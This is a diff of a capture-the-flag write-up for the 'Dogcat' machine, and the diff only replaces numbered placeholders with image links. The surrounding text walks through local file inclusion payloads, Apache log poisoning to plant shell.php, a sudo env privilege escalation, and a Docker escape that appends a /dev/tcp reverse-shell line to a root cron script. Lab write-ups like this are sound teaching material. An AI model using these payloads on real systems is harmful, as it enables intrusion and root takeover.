@@ -41,7 +41,7 @@ There are just two ports open:
 
 Not a whole lot we can do over SSH without credentials, so I fire up Gobuster to find subdirectories/subdomains in the background before heading over to the website. Checking out the landing page gives us the option to choose between seeing pictures of dogs or cats.
 
-1
+![](../assets/img/2026-02-21-Dogcat/1.png)
 
 ## Local File Inclusion
 Upon selecting either one, a random picture is displayed but our choice is also reflected in the URL via the view parameter. A quick test for local file inclusion along with directory traversal characters and an error gets printed.
@@ -50,13 +50,13 @@ Upon selecting either one, a random picture is displayed but our choice is also 
 http://MACHINE_IP/?view=cat../
 ```
 
-2
+![](../assets/img/2026-02-21-Dogcat/2.png)
 
 Since it says failed to open instead of something like forbidden, we can most likely choose which files the site displays. Another thing to note in the error is that the `.php` extension gets appended to whatever we decide, meaning we can't read every file on the system, just those that end in PHP. There's a chance we can use this to read something like a config file in `/var/www/html`, but first we need to figure out where we are in the filesystem.
 
 Looking at the source code for a valid request shows that our query is most likely inside of either the `/dogs` or `/cats` directory. Our full path should be `/var/www/html/cats/[INPUT]` .
 
-3
+![](../assets/img/2026-02-21-Dogcat/3.png)
 
 We can test this by attempting to include the `index.php` page again which should throw a redeclare error at us.
 
@@ -64,7 +64,7 @@ We can test this by attempting to include the `index.php` page again which shoul
 http://MACHINE_IP/?view=cat../../index
 ```
 
-4
+![](../assets/img/2026-02-21-Dogcat/4.png)
 
 Perfect, now since the `.php` extension won't let us read anything else, I use the a PHP filter which will convert the selection into base64 and let us read file contents. Using that on the index page may give us more information on what's happening.
 
@@ -112,7 +112,7 @@ Now let's base64 decode it in our terminal.
 
 Ok it looks like the site parses our input for an extension, and if it's not present then the `.php` extension gets appended to the contents of view. Now we can read all files on the system by simply adding `&ext` to the end of our URL in order to get rid of it. I confirm this by including `/etc/passwd` which shows no real user on the system other than root.
 
-5
+![](../assets/img/2026-02-21-Dogcat/5.png)
 
 ## RCE through Log Poisoning
 This looks like a Docker container and there's no way to get a shell on the box other than gaining RCE via some type of request to the system. Maybe something gets stored when making requests to the site inside the log. Nmap discloses that the site is Apache, so we can check the logs by navigating to `/var/log/apache2/access.log`.
@@ -137,7 +137,7 @@ Next, I capture a request to the main site and specify my User-Agent to include 
 
 _Note: To get that to work, I had to serve it over port 80 as well as not use the base64 method or else the User-Agent would get lost._
 
-6
+![](../assets/img/2026-02-21-Dogcat/6.png)
 
 ## Privilege Escalation
 I confirm that this works by seeing the traffic on my HTTP server and by navigating to `shell.php` in the top level directory, we grab a shell on the box as `www-data`. A quick look at the hostname of the box shows a seemingly random string which is consistent with Docker containers. Also, since Python isn't installed on it, I use the Script binary to stabilize my shell.
@@ -159,14 +159,14 @@ Checking what Sudo permissions our current account has shows that we're allowed 
 sudo /usr/bin/env /bin/bash
 ```
 
-7
+![](../assets/img/2026-02-21-Dogcat/7.png)
 
 The third flag is located under the `/root` directory and now we can focus on escaping this Docker container. 
 
 ## Docker Escape
 While doing internal enumeration on it earlier, I found a backups directory under `/opt` which was owned by root. Inside is a Bash backup script that creates a tar backup of the container to the current directory.
 
-8
+![](../assets/img/2026-02-21-Dogcat/8.png)
 
 Checking the timestamps for the `backup.tar` file within the directory shows that this script is being executed by another host every minute or so. Since we have write permissions over the script, we can just replace it with a reverse shell to escape.
 
@@ -178,6 +178,6 @@ echo 'bash -i >& /dev/tcp/MACHINE_IP/PORT 0>&1' >> backup.sh
 
 After waiting for the cronjob to execute, we get a successful shell on the main host as root.
 
-9
+![](../assets/img/2026-02-21-Dogcat/9.png)
 
 Grabbing the final flag under `/root` completes this challenge. Overall, I really liked this box because there wasn't a super clear way to get RCE on the system and I think log poisoning is a cool concept. I hope this was helpful to anyone following along or stuck and happy hacking!
